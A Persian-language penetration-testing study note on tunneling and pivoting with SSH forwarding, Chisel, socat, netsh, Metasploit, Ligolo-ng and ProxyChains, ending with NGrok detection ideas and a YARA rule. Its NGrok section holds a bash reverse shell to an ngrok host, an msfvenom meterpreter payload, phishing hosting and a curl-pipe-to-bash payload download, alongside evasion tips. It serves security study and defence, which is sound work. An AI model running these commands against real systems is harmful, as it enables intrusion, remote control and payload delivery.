

# Tunneling & Port Forwarding

---

## مفهوم کلی

مشکل: می‌خواهم به سرویسی دسترسی داشته باشم که مستقیم قابل دسترس نیست.

شبکه هدف:
[من] → [Firewall] ✗ → [DB Server:3306]
                   ✗ → [Internal Web:8080]
                   ✗ → [DC:445]

راه حل: از یک ماشین میانی (Pivot) استفاده می‌کنیم

[من] → [Compromised Host] → [DB Server:3306]  ✓


---

## انواع Port Forwarding

Local Port Forwarding    → پورت روی ماشین من را به شبکه هدف وصل کن
Remote Port Forwarding   → پورت روی ماشین هدف را به ماشین من وصل کن
Dynamic Port Forwarding  → SOCKS Proxy کامل بساز


---

## ۱. SSH Tunneling

### Local Port Forwarding (`-L`)

**سناریو:** به RDP یک ماشین داخلی دسترسی ندارم، اما به SSH یک سرور میانی دارم.

[Attacker] ←SSH→ [Jump Server] → [Target:3389]


```bash
# دستور
ssh -L [LOCAL_PORT]:[TARGET_IP]:[TARGET_PORT] user@JUMP_SERVER

# مثال: پورت 3389 ماشین داخلی را روی پورت 13389 خودم باز کن
ssh -L 13389:192.168.10.5:3389 john@10.10.10.1

# حالا از ماشین خودم:
rdesktop 127.0.0.1:13389
xfreerdp /v:127.0.0.1:13389 /u:Administrator
```

```bash
# مثال ۲: MySQL داخلی
ssh -L 3306:10.10.10.50:3306 john@jump.corp.local
mysql -h 127.0.0.1 -P 3306 -u root -p
```

```bash
# پارامترهای مفید:
-N   → فقط tunnel بزن، shell نگیر
-f   → در background اجرا شو
-C   → Compression فعال کن (برای شبکه کند)

ssh -L 13389:192.168.10.5:3389 john@10.10.10.1 -N -f
```

---

### Remote Port Forwarding (`-R`)

**سناریو:** ماشین هدف پشت NAT است و نمی‌توانم به آن وصل شوم. می‌خواهم هدف *به من وصل شود* و من از طریق آن وصل شوم.

[Attacker] ←←←←←←←←←← [Target] (اتصال از هدف به من)
پورت 2222 روی من → پورت 22 هدف


```bash
# روی ماشین هدف اجرا می‌کنیم:
ssh -R [PORT_ON_ATTACKER]:localhost:[TARGET_PORT] attacker@ATTACKER_IP

# مثال: پورت 22 این ماشین را روی پورت 2222 من باز کن
ssh -R 2222:localhost:22 kali@10.10.10.1 -N -f

# حالا از ماشین attacker:
ssh -p 2222 victim@127.0.0.1
```

```bash
# مثال ۲: Reverse Shell Tunnel
# روی هدف:
ssh -R 4444:localhost:4444 kali@10.10.10.1 -N -f
# روی attacker:
nc -lvnp 4444
```

---

### Dynamic Port Forwarding / SOCKS (`-D`)

**سناریو:** می‌خواهم به کل شبکه داخلی دسترسی داشته باشم، نه فقط یک پورت.

```bash
# ایجاد SOCKS5 Proxy روی پورت 1080 خودم
ssh -D 1080 john@jump.corp.local -N -f

# حالا ProxyChains را تنظیم کن:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# هر ابزاری را از طریق tunnel اجرا کن:
proxychains nmap -sV 192.168.10.0/24
proxychains crackmapexec smb 192.168.10.0/24
proxychains python3 GetADUsers.py corp.local/john:Pass123
proxychains curl http://192.168.10.20:8080
```

---

### SSH با Key (بدون Password) — مناسب‌تر برای Automation

```bash
# اگر Private Key داریم:
ssh -i id_rsa -L 13389:192.168.10.5:3389 john@jump -N -f

# با StrictHostKeyChecking بسته شده (مناسب اسکریپت):
ssh -o StrictHostKeyChecking=no -i id_rsa \
    -D 1080 john@jump -N -f
```

---

## ۲. Chisel — بهترین گزینه بدون SSH

وقتی SSH نیست یا Firewall بلاک می‌کند.

[Attacker] ← HTTP/HTTPS → [Chisel Client روی هدف]


### نصب:

```bash
# دانلود از GitHub
# یک فایل باینری standalone، نیازی به نصب ندارد
chmod +x chisel
```

### Server روی Attacker:

```bash
./chisel server --port 8080 --reverse
# --reverse → اجازه می‌دهد Client، tunnel بسازد
```

### Client روی هدف:

```bash
# Local Port Forward
./chisel client 10.10.10.1:8080 L:13389:192.168.10.5:3389

# SOCKS Proxy (Dynamic)
./chisel client 10.10.10.1:8080 R:socks

# پس از اجرای دستور بالا، روی Attacker:
# پورت 1080 به عنوان SOCKS5 باز می‌شود
proxychains nmap 192.168.10.0/24
```

```bash
# Reverse Port Forward
# روی هدف:
./chisel client 10.10.10.1:8080 R:4444:127.0.0.1:4444

# روی attacker پورت 4444 باز می‌شود
nc -lvnp 4444
```

---

## ۳. Netsh — Windows Native

فقط Windows، نیاز به دسترسی Admin دارد.

```cmd
:: Local Port Forward
netsh interface portproxy add v4tov4 \
    listenport=13389 \
    listenaddress=0.0.0.0 \
    connectport=3389 \
    connectaddress=192.168.10.5

:: مشاهده قوانین
netsh interface portproxy show all

:: حذف
netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=0.0.0.0

:: اضافه کردن Firewall Rule
netsh advfirewall firewall add rule \
    name="Pivot 13389" \
    protocol=TCP \
    dir=in \
    localport=13389 \
    action=allow
```

---

## ۴. Socat — Swiss Army Knife

```bash
# نصب
apt install socat

# ──── Local Port Forward ────
# پورت 8888 من را به 192.168.10.5:80 منتقل کن
socat TCP-LISTEN:8888,fork TCP:192.168.10.5:80

# ──── با داشتن دسترسی روی Pivot ────
# روی Pivot:
socat TCP-LISTEN:8888,fork TCP:192.168.10.50:3306 &
# روی Attacker:
mysql -h PIVOT_IP -P 8888

# ──── UDP Forwarding ────
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53

# ──── با SSL ────
socat OPENSSL-LISTEN:443,cert=cert.pem,fork TCP:192.168.10.5:80
```

---

## ۵. Plink (PuTTY) — Windows بدون OpenSSH

```cmd
:: Windows Vista/7 که OpenSSH ندارد
plink.exe -ssh -l john -pw Password123 \
    -R 2222:127.0.0.1:22 \
    10.10.10.1

:: Local Forward
plink.exe -L 13389:192.168.10.5:3389 john@10.10.10.1 -N
```

---

## ۶. Metasploit Pivoting

```ruby
# بعد از گرفتن Meterpreter Session:

# ──── Route اضافه کن ────
meterpreter> run post/multi/manage/autoroute

# یا دستی:
msf> route add 192.168.10.0/24 SESSION_ID

# ──── SOCKS Proxy ────
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> run -j

# حالا proxychains کار می‌کند:
proxychains nmap -sV 192.168.10.0/24

# ──── Port Forward در Meterpreter ────
meterpreter> portfwd add -l 13389 -p 3389 -r 192.168.10.5
meterpreter> portfwd list
meterpreter> portfwd delete -l 13389
```

---

## ۷. Ligolo-ng — پیشرفته‌ترین گزینه

عملکرد مثل VPN واقعی، Layer 3 Tunneling.

```bash
# ──── Attacker (Proxy Server) ────
./proxy -selfcert -laddr 0.0.0.0:11601

# ──── هدف (Agent) ────
./agent -connect 10.10.10.1:11601 -ignore-cert

# ──── روی Attacker در Ligolo CLI ────
ligolo-ng» session              # انتخاب session
ligolo-ng» ifconfig             # دیدن interface های هدف
ligolo-ng» start                # شروع tunnel

# اضافه کردن route روی Kali:
sudo ip route add 192.168.10.0/24 dev ligolo

# حالا مستقیم:
nmap -sV 192.168.10.0/24       # بدون proxychains!
ssh john@192.168.10.5          # مستقیم!
```

---

## مقایسه ابزارها

┌──────────────┬──────────┬──────────┬────────────┬──────────┐
│ ابزار        │ نیاز SSH │  OS      │  Stealth   │ راحتی   │
├──────────────┼──────────┼──────────┼────────────┼──────────┤
│ SSH Tunneling│   بله   │ Win/Lin  │   متوسط    │  زیاد   │
│ Chisel       │   خیر   │ Win/Lin  │   زیاد     │  زیاد   │
│ Ligolo-ng    │   خیر   │ Win/Lin  │   زیاد     │  زیاد   │
│ Socat        │   خیر   │ Lin/Mac  │   متوسط    │  متوسط  │
│ Netsh        │   خیر   │  فقط Win │   کم       │  زیاد   │
│ Plink        │   بله   │  فقط Win │   کم       │  متوسط  │
│ MSF Pivot    │   خیر   │ Win/Lin  │   کم       │  زیاد   │
└──────────────┴──────────┴──────────┴────────────┴──────────┘


---

## سناریوی کامل (Double Pivot)

[Attacker:10.0.0.1] → [Pivot1:10.0.0.5/192.168.1.5] → [Pivot2:192.168.1.10/172.16.0.10] → [Target:172.16.0.20]


```bash
# مرحله ۱: Chisel Server روی Attacker
./chisel server --port 8080 --reverse

# مرحله ۲: روی Pivot1 — SOCKS به Attacker
./chisel client 10.0.0.1:8080 R:socks
# پورت 1080 روی Attacker = شبکه 192.168.1.0/24

# مرحله ۳: روی Pivot1 — Forward کردن Chisel به Pivot2
proxychains ./chisel server --port 8081 --reverse
# (این Chisel روی Pivot1 اجرا می‌شود)

# مرحله ۴: روی Pivot2 — SOCKS به Pivot1
./chisel client 192.168.1.5:8081 R:socks
# پورت 1081 روی Pivot1 = شبکه 172.16.0.0/24

# نتیجه:
proxychains2 nmap 172.16.0.20    # از طریق هر دو Pivot
```

---

## ProxyChains تنظیم

```bash
# /etc/proxychains4.conf

# ──── یک Proxy ────
[ProxyList]
socks5 127.0.0.1 1080

# ──── زنجیر Proxy ها (Double Pivot) ────
[ProxyList]
socks5 127.0.0.1 1080    # Pivot1
socks5 127.0.0.1 1081    # Pivot2

# strict_chain  → ترتیب دقیق
# dynamic_chain → اگر یکی کار نکرد بعدی را امتحان کن
```



---


## تحلیل دستور

```bash
ssh sepi@192.168.30.137 -L 127.0.0.1:1212:192.168.0.176:8000
```

---

### ساختار `-L`

-L [BIND_ADDRESS]:[LOCAL_PORT]:[REMOTE_HOST]:[REMOTE_PORT]


---

### سه IP در این دستور

127.0.0.1        → Loopback (خود ماشین Kali)
192.168.30.137   → Jump Server (ماشین میانی)
192.168.0.176    → Target (هدف نهایی)


---

### جزء به جزء

| بخش | مقدار | معنی |
|-----|-------|------|
| `sepi@192.168.30.137` | Jump Server | به این ماشین SSH می‌زنیم |
| `127.0.0.1:1212` | Loopback Kali | روی پورت 1212 خودمان گوش می‌دهیم |
| `192.168.0.176:8000` | Target | ترافیک به اینجا فوروارد می‌شود |

---

### دیاگرام

[Kali]──────────SSH──────────[Jump:192.168.30.137]────[Target:192.168.0.176:8000]
   ↑
127.0.0.1:1212
(اینجا گوش می‌دهیم)


**نتیجه:** وقتی روی Kali به `127.0.0.1:1212` وصل شویم، ترافیک از طریق Jump Server به `192.168.0.176:8000` می‌رسد.

```bash
# مثلاً:
curl http://127.0.0.1:1212
# در واقع داری به 192.168.0.176:8000 وصل می‌شی
```

---

### چرا `127.0.0.1` به جای `0.0.0.0`؟

127.0.0.1 → فقط خود Kali می‌تواند استفاده کند (امن‌تر)
0.0.0.0   → هر کسی در شبکه می‌تواند از این tunnel استفاده کند


## ProxyChains

ابزاری که ترافیک هر برنامه‌ای را از طریق یک یا چند Proxy هدایت می‌کند.

```bash
# کانفیگ اصلی
/etc/proxychains.conf  (یا proxychains4.conf)
```

```ini
# آخر فایل:
[ProxyList]
socks5  127.0.0.1  1080
```

### استفاده

```bash
proxychains nmap -sT 192.168.0.176
proxychains curl http://192.168.0.176
proxychains python3 exploit.py
```

فقط `proxychains` قبل از هر دستور — همین.

---

## سناریوی کامل که گفتی

دقیقاً درست فهمیدی. این یکی از کاربردی‌ترین سناریوهاست:

[Kali] ──SSH Dynamic─── [Jump Server] ───── [شبکه داخلی AD]
           -D 1080                          192.168.0.0/24


### مرحله ۱ — ایجاد SOCKS5 Proxy

```bash
ssh -D 127.0.0.1:1080 sepi@192.168.30.137 -N
# -D → Dynamic (SOCKS5)
# -N → اجرا نشه shell، فقط tunnel باشه
```

### مرحله ۲ — اجرای ابزار از Kali

```bash
# LDAP Query مستقیم از Kali
proxychains ldapsearch -x -H ldap://192.168.0.10 -b "DC=corp,DC=local"

# PowerView از طریق Evil-WinRM یا CrackMapExec
proxychains crackmapexec smb 192.168.0.0/24

# Impacket مستقیم
proxychains python3 GetUserSPNs.py corp.local/user:pass -dc-ip 192.168.0.10
```

---

### چرا این روش بهتر است؟

| روش قدیمی | این روش |
|-----------|---------|
| آپلود ابزار روی هدف | ابزار فقط روی Kali |
| ریسک شناسایی بالا | footprint کمتر |
| نیاز به Write permission | فقط SSH کافی است |
| آنتی‌ویروس ممکن است بلاک کند | مشکلی نیست |

**خلاصه:** Jump Server فقط به عنوان **پل** استفاده می‌شود — هیچ ابزاری روی آن نیست.




**مرحله ۱ — Tunnel:**
دسترسی به یک سیستم داخلی پیدا می‌کنی → SSH Dynamic (`-D 1080`) می‌زنی → یک SOCKS5 Proxy روی `localhost:1080` باز می‌شه که ترافیک رو از طریق اون سیستم به شبکه داخلی هدایت می‌کنه.

**مرحله ۲ — Pivot:**
از پشت اون tunnel، با ابزارهای روی Kali خودت (Impacket، CrackMapExec، ldapsearch و...) مستقیم به شبکه داخلی می‌زنی — انگار که داری از داخل شبکه کار می‌کنی.

یعنی **tunnel = دسترسی** و **pivot = استفاده از اون دسترسی** برای رفتن عمیق‌تر.


ترتیب درست اینه:

**اول ProxyChains تنظیم کن، بعد SSH Tunnel بزن.**

---

**چرا؟**

ProxyChains فقط یک فایل config هست (`/etc/proxychains4.conf`) — هیچ سرویسی start نمی‌کنه. پس ترتیبش مهم نیست از نظر فنی، ولی **منطق کار اینه:**

1. **تنظیم ProxyChains** — فایل config رو ویرایش می‌کنی:
      socks5  127.0.0.1  1080
   ```

2. **زدن SSH Tunnel** — پورت `1080` رو روی localhost باز می‌کنه:
   ```bash
   ssh -D 1080 -N user@jump-server
   ```

3. **استفاده از ابزار از طریق ProxyChains:**
   ```bash
   proxychains nmap -sT 192.168.1.10
   ```

---

**خلاصه:**
ProxyChains = تنظیم | SSH = اجرا | ابزار = استفاده

هر ترتیبی بین ۱ و ۲ قابل قبوله، ولی **SSH باید قبل از استفاده از ابزار** در حال اجرا باشه.


---

# Remote Port Forwarding (Reverse SSH)

### مشکلی که حل می‌کنه:
وقتی سیستم قربانی **پشت Firewall یا NAT** هست و تو **نمی‌تونی مستقیم بهش وصل بشی**.

---

### منطق کار:

Attacker Machine          Jump/VPS Server         Victim (behind NAT)
   192.168.1.10          203.0.113.5              10.0.0.5

        <─────────────────────────────────────────
                    victim initiates connection


قربانی **خودش** به سرور تو وصل می‌شه و یک تونل برمی‌گردونه.

---

### دستور:

**روی سیستم قربانی اجرا می‌شه:**
```bash
ssh -R 4444:localhost:22 attacker@203.0.113.5
```

یعنی:
- پورت `4444` روی سرور مهاجم (`203.0.113.5`) باز شه
- هر ترافیکی که به اون پورت بره → به `localhost:22` قربانی برسه

**بعد مهاجم از سرورش وصل می‌شه:**
```bash
ssh -p 4444 user@localhost
```

---

### پارامترها:

| پارامتر | معنی |
|--------|------|
| `-R` | Remote (Reverse) |
| `4444` | پورتی که روی سرور مهاجم باز می‌شه |
| `localhost:22` | مقصد نهایی (از دید قربانی) |

---

### کاربرد عملی‌تر:

```bash
# قربانی پورت RDP خودشو expose می‌کنه
ssh -R 3389:localhost:3389 attacker@vps

# یا یه سرویس داخلی شبکه
ssh -R 8080:192.168.1.100:80 attacker@vps
```

---

### نکته کلیدی:
در `/etc/ssh/sshd_config` سرور مهاجم باید این باشه:
GatewayPorts yes

وگرنه پورت فقط روی `127.0.0.1` سرور bind می‌شه، نه همه interfaceها.


دستور روی **سیستم قربانی** زده می‌شه.

---

### چرا؟

چون **قربانی پشت NAT/Firewall** هست و مهاجم نمی‌تونه بهش وصل بشه. پس **قربانی** باید خودش connection رو شروع کنه به سمت مهاجم.

---

### ترتیب کار:

1. مهاجم: sshd روی VPS خودش در حال اجراست (منتظره)

2. قربانی: این دستور رو اجرا می‌کنه:
   ssh -R 4444:localhost:22 attacker@VPS_IP

3. مهاجم: حالا از VPS خودش می‌زنه:
   ssh -p 4444 victim_user@localhost


---

### قانون کلی یادآوری:

| نوع                   | چه کسی دستور می‌زنه؟ |
| --------------------- | -------------------- |
| Local Forward (`-L`)  | مهاجم                |
| Remote Forward (`-R`) | قربانی               |
| Dynamic (`-D`)        | مهاجم                |
|                       |                      |



دقیقا. ولی یه نکته دقیق‌تر:

**مهاجم از قبل listen نمی‌کنه** — خود دستور `-R` روی سرور قربانی باعث می‌شه که SSH daemon روی VPS مهاجم اون پورت رو **خودکار** باز کنه.

---

### ترتیب دقیق:

1. قربانی دستور می‌زنه:
   ssh -R 4444:localhost:22 attacker@VPS_IP
         │
         └─► این دستور به VPS مهاجم می‌گه:
             "پورت 4444 روی خودت باز کن و ترافیکش رو به
              پورت 22 من (localhost) هدایت کن"

2. VPS مهاجم: پورت 4444 رو listen می‌کنه (خودکار توسط SSH)

3. مهاجم از VPS:
   ssh -p 4444 victim_user@localhost
   └─► از طریق tunnel به SSH قربانی وصل می‌شه


---

### خلاصه یه‌خطی:

> قربانی tunnel رو **از طرف خودش به VPS** می‌زنه، و VPS مهاجم پورت رو **در لحظه** باز می‌کنه.


![[Pasted image 20260613035433.png]]


# خلاصه 

# SSH Tunneling - مرور کامل

---

## 1. Local Port Forwarding (`-L`)

ssh -L [local_port]:[target_host]:[target_port] user@ssh_server


**سناریو:** مهاجم به سرویسی در شبکه داخلی هدف دسترسی ندارد.

[Attacker] ──SSH──► [Pivot/SSH Server] ──► [Internal Service]
localhost:8080                               192.168.1.100:80


**مثال عملی:**
```bash
ssh -L 8080:192.168.1.100:80 user@pivot_server
# حالا: curl http://localhost:8080 == دسترسی به 192.168.1.100:80
```

**نکات کلیدی:**
- دستور از سمت **مهاجم** اجرا می‌شود
- پورت روی ماشین **مهاجم** باز می‌شود
- برای دسترسی به یک سرویس خاص مناسب است

---

## 2. Remote Port Forwarding (`-R`)

ssh -R [remote_port]:[local_host]:[local_port] user@attacker_vps


**سناریو:** قربانی پشت NAT/Firewall است و مهاجم نمی‌تواند مستقیم به او وصل شود.

[Attacker VPS] ◄──SSH── [Victim] (behind NAT)
VPS:4444                 localhost:22


**مثال عملی:**
```bash
# دستور روی ماشین قربانی اجرا می‌شود:
ssh -R 4444:localhost:22 attacker@VPS_IP

# مهاجم از VPS:
ssh -p 4444 victim_user@localhost
```

**نکات کلیدی:**
- دستور از سمت **قربانی** اجرا می‌شود
- پورت روی ماشین **مهاجم (VPS)** باز می‌شود
- نیاز به `GatewayPorts yes` در `/etc/ssh/sshd_config` برای bind روی `0.0.0.0`
- بدون نیاز به inbound connection به قربانی

---

## 3. Dynamic Port Forwarding (`-D`)

ssh -D [local_port] user@pivot_server


**سناریو:** نیاز به دسترسی به **کل شبکه** داخلی (نه فقط یک سرویس).

[Attacker] ──SOCKS5──► [Pivot] ──► [Entire Internal Network]
localhost:1080                       10.10.10.0/24


**مثال عملی:**
```bash
# ایجاد SOCKS5 proxy:
ssh -D 1080 user@pivot_server

# تنظیم proxychains (/etc/proxychains4.conf):
socks5 127.0.0.1 1080

# استفاده با ابزارها:
proxychains nmap -sT 10.10.10.0/24
proxychains ldapsearch -H ldap://dc.internal.local ...
proxychains crackmapexec smb 10.10.10.0/24
```

**نکات کلیدی:**
- یک **SOCKS Proxy** کامل ایجاد می‌کند
- با **ProxyChains** می‌توان هر ابزاری را از آن عبور داد
- `-D` نیاز به مشخص کردن host مقصد ندارد (dynamic است)
- `nmap` با `-sS` (SYN scan) از ProxyChains عبور **نمی‌کند** — باید از `-sT` استفاده کرد

---

## مقایسه سریع

| ویژگی | Local (`-L`) | Remote (`-R`) | Dynamic (`-D`) |
|-------|-------------|--------------|----------------|
| دستور اجرا از | مهاجم | قربانی | مهاجم |
| پورت باز روی | مهاجم | VPS مهاجم | مهاجم |
| پروتکل | TCP | TCP | SOCKS4/5 |
| هدف | یک سرویس خاص | bypass NAT | کل شبکه |

---

## ابزارهای معروف

### **Chisel**
```bash
# Server (VPS مهاجم):
chisel server -p 8000 --reverse

# Client (pivot یا قربانی):
chisel client VPS_IP:8000 R:socks          # SOCKS proxy
chisel client VPS_IP:8000 R:4444:localhost:22  # port forward
```
- ترافیک را داخل **HTTP/HTTPS** مخفی می‌کند
- یک باینری standalone (Go)
- مناسب برای محیط‌هایی که SSH محدود است

---

### **Ligolo-ng**
```bash
# Proxy (مهاجم):
./proxy -selfcert -laddr 0.0.0.0:11601

# Agent (روی pivot):
./agent -connect VPS_IP:11601 -ignore-cert

# در Ligolo console:
session          # انتخاب session
start            # شروع tunnel
```
- عملکرد **Layer 3** (مثل VPN واقعی)
- نیاز به ProxyChains ندارد — route مستقیم
- برای pivoting در شبکه‌های پیچیده ایده‌آل است

```bash
# اضافه کردن route (لینوکس):
ip route add 10.10.10.0/24 dev ligolo
```

---

### **Metasploit (portfwd)**
msf> use post/multi/manage/portfwd
msf> sessions -i 1
meterpreter> portfwd add -l 8080 -p 80 -r 192.168.1.100


---

### **socat**
```bash
# Simple TCP relay:
socat TCP-LISTEN:4444,fork TCP:internal_host:22

# با SSL:
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:22
```

---

### **rpivot**
- SOCKS4 proxy از طریق HTTP (مناسب bypass محیط‌های محدود)

---

### **reGeorg / Neo-reGeorg**
- **Web Shell** مبتنی بر HTTP — tunnel از طریق یک فایل PHP/ASPX روی سرور هدف
- مناسب وقتی فقط دسترسی به web server دارید

---

## نکته عملیاتی مهم

همیشه ترجیح بده ابزار رو روی Kali خودت اجرا کنی
و ترافیک رو از طریق tunnel بفرستی
به جای upload ابزار روی target


این کار:
- **ریسک شناسایی** را کاهش می‌دهد
- **آثار forensic** کمتری روی سیستم هدف می‌گذارد
- در صورت قطع session، ابزار روی هدف نمی‌ماند



---

پس ما وقتی که وارد شبکه میشیم نیاز داریم به یک زیر ساخت tunneling  برای اینکه بتونیم از اون سیستمی وجود داره سایر سیستم های شبکه رو بزنیم یا ابزار هامون به واسطه اون tunnel اجرا بکنیم و خروجیش  رو بگیریم بدون اینکه اون ابزار رو داخل اون سیستم اجرا کنیم 


### Hunting 

	-https://github.com/qjawls2003/eBPF-Detect-SSH-Tunnels
یکی از پروژه هایی مه وجود دارد در زمینه  تشخیص SSH Tunneling  این پروژه است 

# eBPF-Detect-SSH-Tunnels

## هدف پروژه

این پروژه یک **ابزار دفاعی/تشخیصی** است که از **eBPF** برای شناسایی SSH Tunneling در سطح kernel استفاده می‌کند.

---

## چرا eBPF؟

ابزارهای معمولی مثل `netstat` یا `ss` فقط **connection‌های فعال** را نشان می‌دهند.  
SSH Tunnel از دید آن‌ها مثل یک اتصال SSH معمولی به نظر می‌رسد.

eBPF اجازه می‌دهد مستقیم در **kernel space** رویدادهای شبکه را hook کرد — بدون تغییر کد kernel.

---

## معماری کلی

User Space                  Kernel Space
─────────────────────────────────────────
Python Script  ◄──────── eBPF Program
(output/alert)            │
                          ├── hook: sys_connect
                          ├── hook: sys_accept  
                          └── بررسی TCP forwarding patterns


---

## منطق تشخیص

SSH Tunnel یک pattern مشخص دارد:

# رفتار معمولی SSH:
Process A  ──► SSH Port 22 (یک اتصال)

# رفتار SSH Tunnel:
Process A  ──► Port 1080 (local)
              │
              └──► SSH Process ──► Port 22 ──► Remote
                   (forwarded connection از یک PID دیگر)


ابزار دنبال این می‌گردد:
- پروسه‌ای که روی یک پورت **listen** می‌کند و همزمان یک SSH connection **فعال** دارد
- ترافیک ورودی که از طریق `sshd` به آدرس دیگری **forward** می‌شود

---

## تکنولوژی‌های به‌کار رفته

| لایه | ابزار |
|------|-------|
| Kernel hook | eBPF (BCC framework) |
| زبان eBPF | C (کد inject شده در kernel) |
| زبان User-space | Python |
| Framework | BCC (BPF Compiler Collection) |

---

## محدودیت‌ها

- نیاز به **root** دارد
- نیاز به kernel با پشتیبانی eBPF (معمولاً kernel >= 4.4)
- BCC باید نصب باشد
- False positive در محیط‌هایی با load forwarding بالا ممکن است

---

## اهمیت از دیدگاه Red/Blue Team

**Blue Team:**
- می‌توان آن را به عنوان بخشی از EDR یا HIDS استفاده کرد
- تشخیص tunneling حتی وقتی ترافیک رمزشده است

**Red Team:**
- باید بداند چنین مکانیزمی وجود دارد
- Ligolo-ng و Chisel هم می‌توانند توسط چنین ابزاری شناسایی شوند
- روش‌های evasion: استفاده از پورت‌های non-standard، traffic shaping

---


# NGrok 

## چیست؟

**NGrok** یک ابزار **Reverse Proxy / Tunneling** است که یک سرویس داخلی (localhost) را از طریق اینترنت عمومی قابل دسترس می‌کند — بدون نیاز به تنظیم فایروال، پورت‌فورواردینگ یا IP ثابت.

---

## معماری کلی

Your Machine (localhost:8080)
        │
        │  outbound connection
        ▼
   NGrok Agent  ──────────────────►  NGrok Cloud
                                         │
                                         │ Public URL
                                         ▼
                              https://abc123.ngrok.io
                                         │
                              ◄──────────┘
                         Internet User/Attacker


مهم‌ترین نکته: **اتصال از سمت قربانی به بیرون است** (outbound) — فایروال‌های معمولی آن را block نمی‌کنند.

---

## نصب و راه‌اندازی

```bash
# نصب
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz

# احراز هویت با token
./ngrok authtoken <YOUR_TOKEN>

# اجرای ساده
./ngrok http 8080        # HTTP tunnel روی پورت 8080
./ngrok tcp 4444         # TCP tunnel (برای reverse shell)
./ngrok http localhost:3000
```

---

## انواع Tunnel

| نوع | دستور | کاربرد |
|-----|-------|---------|
| HTTP/HTTPS | `ngrok http 8080` | وب‌سرور، webhook |
| TCP | `ngrok tcp 22` | SSH، netcat، raw TCP |
| TLS | `ngrok tls 443` | ترافیک TLS custom |

---

## خروجی بعد از اجرا

Session Status    online
Account           user@email.com
Version           3.x.x
Region            United States (us)
Forwarding        https://abc123.ngrok-free.app -> localhost:8080
Forwarding        tcp://0.tcp.ngrok.io:12345    -> localhost:4444

Connections       ttl     opn     rt1     rt5     p50     p90
                  0       0       0.00    0.00    0.00    0.00


---

## کاربردهای Offensive Security

### 1. Reverse Shell از طریق NGrok

```bash
# روی سیستم مهاجم:
./ngrok tcp 4444
# خروجی: tcp://0.tcp.ngrok.io:19832

# listener محلی:
nc -lvnp 4444

# روی قربانی (payload):
bash -i >& /dev/tcp/0.tcp.ngrok.io/19832 0>&1
```

### 2. C2 (Command & Control) Hosting

```bash
# Metasploit handler پشت NGrok:
./ngrok tcp 4444

# در msfconsole:
use exploit/multi/handler
set LHOST 0.0.0.0
set LPORT 4444
run

# payload برای قربانی با آدرس NGrok:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=0.tcp.ngrok.io LPORT=19832 -f exe -o shell.exe
```

### 3. Phishing Page Hosting

```bash
python3 -m http.server 8080
./ngrok http 8080
# URL عمومی برای ارسال به هدف
```

### 4. Webhook / Payload Delivery

```bash
# سرور فایل برای دانلود payload:
./ngrok http 8000
# قربانی: curl https://abc.ngrok.io/shell.sh | bash
```

---

## کاربردهای Defensive / Legitimate

- تست webhook در development
- نمایش demo بدون deploy
- دسترسی موقت به سرویس‌های محلی
- تست API از خارج شبکه

---

## مقایسه با ابزارهای مشابه

| ابزار | پروتکل | نیاز به سرور | رایگان | ویژگی |
|-------|---------|-------------|--------|-------|
| NGrok | HTTP/TCP/TLS | خیر (cloud) | محدود | آسان‌ترین |
| Chisel | HTTP/HTTPS | بله | بله | انعطاف بیشتر |
| SSH -R | SSH | بله | بله | بدون نصب اضافی |
| Ligolo-ng | L3 | بله | بله | کامل‌ترین |
| Cloudflare Tunnel | HTTPS | خیر (cloud) | بله | enterprise-grade |

---

## تشخیص و شناسایی (Blue Team)

### شاخص‌های IOC:

DNS queries به:
  - *.ngrok.io
  - *.ngrok-free.app
  - ngrok.com
  - *.tcp.ngrok.io

User-Agent در HTTP headers:
  - "ngrok"

پروسه مشکوک:
  - ngrok.exe / ngrok در لیست پروسه‌ها
  - اتصال outbound پایدار به IP‌های NGrok


### Event‌های قابل بررسی:

- DNS logs: query به *.ngrok.io
- Firewall logs: اتصال outbound به پورت 443 با دوام غیرعادی
- Process creation logs: اجرای فایل "ngrok"
- Network: ترافیک به AS396387 (NGrok Inc.)


### YARA Rule (ساده):

```yara
rule detect_ngrok {
    strings:
        $s1 = "ngrok.io" ascii
        $s2 = "ngrok-free.app" ascii
        $s3 = "Ngrok-Agent" ascii
    condition:
        any of them
}
```

---

## محدودیت‌های نسخه رایگان

| محدودیت | مقدار |
|---------|-------|
| تعداد tunnel همزمان | 1 |
| Request در دقیقه | 40 |
| URL ثابت | خیر (هر بار تغییر می‌کند) |
| Custom domain | خیر |
| TCP tunnel | بله (با ثبت‌نام) |

---

## نکته عملیاتی مهم

برای Red Team: NGrok ساده‌ترین راه برای **bypassing NAT و Firewall** است اما:
- نیاز به اکانت دارد (قابل ردیابی)
- ترافیک از سرورهای NGrok رد می‌شود (MITM ممکن)
- Blue Teamهای حرفه‌ای DNS query به `*.ngrok.io` را monitor می‌کنند

برای عملیات واقعی‌تر: **Chisel** یا **Ligolo-ng** روی VPS شخصی ترجیح دارد.


